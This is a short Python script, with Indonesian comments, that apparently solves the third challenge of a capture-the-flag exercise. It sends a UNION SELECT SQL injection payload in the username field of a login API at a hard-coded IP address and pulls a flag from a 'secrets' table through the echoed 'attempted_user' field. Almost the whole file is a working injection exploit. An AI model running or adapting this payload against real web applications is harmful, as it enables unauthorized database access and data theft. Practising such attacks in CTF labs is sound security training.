import requests

def solve_challenge3():
    print("=== Menyelesaikan Challenge 3 (SQL Injection) ===")
    url = "http://20.212.111.212:5001/api/ch3/login"
    
    # Payload SQLi: Kita menggunakan UNION SELECT untuk memanggil flag dari tabel secrets
    # Karena aplikasi mengembalikan nama pengguna yang diuji saat gagal login, kita manfaatkan error handling ini.
    sqli_payload = "' UNION SELECT flag, 'x' FROM secrets--"
    
    print(f"[*] Mengirim POST request ke {url} dengan payload username: {sqli_payload}")
    try:
        r = requests.post(url, json={"username": sqli_payload, "password": "any"}, timeout=5)
        data = r.json()
        
        # Flag akan ditampilkan di bagian 'attempted_user' karena UNION menempatkan flag di kolom username
        if data.get("attempted_user") and "UPI{" in data.get("attempted_user"):
            flag = data.get("attempted_user")
            print(f"[+] Flag Challenge 3 Ditemukan: {flag}\n")
        else:
            print(f"[-] Gagal. Response: {r.text}\n")
    except Exception as e:
        print(f"[-] Error: {e}\n")

if __name__ == "__main__":
    solve_challenge3()
